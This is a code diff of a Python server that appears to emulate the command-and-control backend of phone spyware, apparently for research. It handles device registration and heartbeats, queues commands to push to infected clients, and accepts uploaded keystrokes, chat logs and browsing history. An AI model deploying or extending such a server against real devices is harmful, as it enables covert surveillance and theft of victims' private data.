@@ -437,56 +437,57 @@ def _normalize_action(action: str) -> str:
 
 @app.api_route("/index.php", methods=["GET", "POST"])
 async def api_router(request: Request, m: str = Query("api"), a: str = Query("")):
-    """Main router -- dispatches based on ?m=api&a={action}."""
+    body = await request.body()
     canonical = _normalize_action(a)
-    body = await _save_upload(a, canonical, request)
-    body_str = body.decode("utf-8", errors="replace")
-    client = parse_xml_field(body_str, "Client") or "unknown"
-    version = detect_version(body_str, client)
 
-    # Track device
-    if client not in devices and client != "unknown":
-        devices[client] = {
-            "client_id": client,
-            "first_seen": datetime.now().isoformat(),
-            "last_seen": datetime.now().isoformat(),
-            "version": version,
-            "actions": [],
-        }
-    if client in devices:
-        devices[client]["last_seen"] = datetime.now().isoformat()
-        devices[client]["actions"].append(canonical)
-        if version != "unknown":
-            devices[client]["version"] = version
+    body_bytes, client, entry = await _save_upload(a, canonical, request, body)
+    version = entry.get("version", "unknown")
+    license_plain = entry.get("license_plain")
+
+    _track_device(client, version, canonical, license_plain)
 
     handler = HANDLERS.get(canonical, _handle_generic)
-    return await handler(request, body, body_str, client, canonical)
+    return await handler(request, body_bytes, entry, client, canonical)
 
 
-# --- Handler implementations ---
+# --- Handlers ---
 
-async def _handle_register(request, body, body_str, client, action):
+async def _handle_register(request, body, entry, client, action):
     log.info("REGISTER device: %s", client)
     return PlainTextResponse(xml_response("500", client))
 
 
-async def _handle_account(request, body, body_str, client, action):
+async def _handle_account(request, body, entry, client, action):
     log.info("ACCOUNT check: %s", client)
     return PlainTextResponse(xml_response("500", client))
 
 
-async def _handle_cycle(request, body, body_str, client, action):
-    """Heartbeat -- respond with 500 (success) + optional embedded commands."""
+async def _handle_cycle(request, body, entry, client, action):
+    """Heartbeat — §5: dépile command_queue dans la réponse, §7: forced_ret."""
     extra = ""
-    if command_queue:
-        for cmd in command_queue:
-            if "<Surrounding>" in cmd:
-                extra += cmd
-    log.info("CYCLE from %s", client)
-    return PlainTextResponse(xml_response("500", client, extra))
+
+    # §5 — embarquer les commandes en queue dans la réponse cycle
+    queued = []
+    remaining = []
+    for cmd in command_queue:
+        queued.append(cmd)
+    command_queue.clear()
+    for cmd in queued:
+        extra += cmd
+
+    # §7 — code de retour forcé
+    ret = "500"
+    if client in devices and devices[client].get("forced_ret"):
+        ret = devices[client]["forced_ret"]
+        devices[client]["forced_ret"] = None
+        log.info("CYCLE from %s — forced ret=%s (one-shot)", client, ret)
+    else:
+        log.info("CYCLE from %s", client)
+
+    return PlainTextResponse(xml_response(ret, client, extra))
 
 
-async def _handle_get_settings(request, body, body_str, client, action):
+async def _handle_get_settings(request, body, entry, client, action):
     log.info("GET_SETTINGS: %s", client)
     settings_xml = (
         "<Settings>"
@@ -504,43 +505,41 @@ async def _handle_get_settings(request, body, body_str, client, action):
     return PlainTextResponse(xml_response("500", client, settings_xml))
 
 
-async def _handle_set_settings(request, body, body_str, client, action):
-    log.info("SET_SETTINGS from %s: %s", client, body_str[:200])
+async def _handle_set_settings(request, body, entry, client, action):
+    log.info("SET_SETTINGS from %s", client)
     return PlainTextResponse(xml_response("500", client))
 
 
-async def _handle_get_websocket_address(request, body, body_str, client, action):
+async def _handle_get_websocket_address(request, body, entry, client, action):
     host = request.headers.get("host", "127.0.0.1:8443")
     scheme = "wss" if "https" in str(request.url) else "ws"
     ws_url = f"{scheme}://{host}/ws"
     log.info("WS_ADDRESS requested by %s -> %s", client, ws_url)
     return PlainTextResponse(
-        f"<IKMService><Ret>500</Ret><Client>{client}</Client>"
+        f"<IKMService><Ret>500</Ret><Client>{_xml_escape(client)}</Client>"
         f"<WSAddress>{ws_url}</WSAddress></IKMService>"
     )
 
 
-async def _handle_check_update(request, body, body_str, client, action):
+async def _handle_check_update(request, body, entry, client, action):
     log.info("CHECK_UPDATE: %s", client)
     return PlainTextResponse(
-        f"<IKMService><Ret>500</Ret><Client>{client}</Client>"
+        f"<IKMService><Ret>500</Ret><Client>{_xml_escape(client)}</Client>"
         f"<UpdateAvailable>0</UpdateAvailable></IKMService>"
     )
 
 
-async def _handle_upload_data(request, body, body_str, client, action):
+async def _handle_upload_data(request, body, entry, client, action):
     log.info("UPLOAD [%s] from %s (%d bytes)", action, client, len(body))
     return PlainTextResponse(xml_response("500", client))
 
 
-async def _handle_generic(request, body, body_str, client, action):
+async def _handle_generic(request, body, entry, client, action):
     log.info("UNKNOWN action [%s] from %s", action, client)
     return PlainTextResponse(xml_response("500", client))
 
 
-# Action -> handler mapping -- covers BOTH v17.4 AND v19.1 canonical names
 HANDLERS = {
-    # Control & auth
     "register": _handle_register,
     "account": _handle_account,
     "cycle": _handle_cycle,
@@ -551,7 +550,6 @@ HANDLERS = {
     "download_update": _handle_generic,
     "reset_password": _handle_generic,
     "schedule_surround": _handle_generic,
-    # Data exfiltration -- canonical (v19.1) names
     "upload_keystrokes": _handle_upload_data,
     "upload_chat_logs": _handle_upload_data,
     "upload_website_history": _handle_upload_data,
@@ -574,14 +572,15 @@ HANDLERS = {
 
 
 # ---------------------------------------------------------------------------
-# WebSocket -- real-time command channel
+# §6 — WebSocket avec corrélation par device
 # ---------------------------------------------------------------------------
 
 @app.websocket("/ws")
 async def websocket_endpoint(ws: WebSocket):
     await ws.accept()
-    ws_connections.append(ws)
-    log.info("WebSocket connected (total: %d)", len(ws_connections))
+    ws_client_id: Optional[str] = None
+    ws_anon.append(ws)
+    log.info("WebSocket connected (anon, total ws: %d)", len(ws_anon) + len(ws_connections))
 
     on_connect = xml_command("onConnect", "0", "")
     await ws.send_text(on_connect)
